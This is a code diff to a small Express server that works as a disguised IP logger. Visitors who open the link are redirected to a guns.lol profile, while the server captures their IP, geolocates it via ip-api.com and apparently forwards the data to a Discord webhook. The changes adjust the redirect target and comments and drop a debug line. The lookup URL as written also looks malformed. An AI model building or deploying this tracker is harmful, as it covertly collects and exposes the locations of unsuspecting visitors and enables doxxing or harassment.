@@ -3,22 +3,22 @@ const axios = require('axios');
 const app = express();
 
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
-const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
+const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol/xsaint'; 
 
 app.get('/', async (req, res) => {
     // 1. Grab raw header tracking string
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     
-    // 2. Clean up common proxy list formatting
+    // 2. FIXED: Isolates the first clean IP address before any proxy commas without using array split methods
     let clientIp = rawIp.replace(/,.*$/, '').trim();
 
-    // 3. CLEANER: Remove IPv6 local nesting wraps (e.g., "::ffff:127.0.0.1" -> "127.0.0.1")
+    // 3. Strip internal IPv6 encapsulation if Render presents a hybrid address
     if (clientIp.includes('::ffff:')) {
         clientIp = clientIp.replace('::ffff:', '');
     }
 
-    // 4. If the resulting IP is blank or local, default it to a clean public IP for lookup tracking
-    if (!clientIp || clientIp === '::1' || clientIp === '127.0.0.1' || clientIp === 'localhost') {
+    // 4. Fallback safeguard for testing routes locally or if empty
+    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') {
         clientIp = '8.8.8.8'; 
     }
 
@@ -26,9 +26,8 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try {
-            // 5. Construct cleanly and log for debug verification
+            // 5. Build URL safely with standard string chaining
             const apiUrl = 'http://ip-api.com' + clientIp + '?fields=61439';
-            console.log("Sending query to API endpoint:", apiUrl);
             
             const geoResponse = await axios.get(apiUrl);
             const geoData = geoResponse.data;
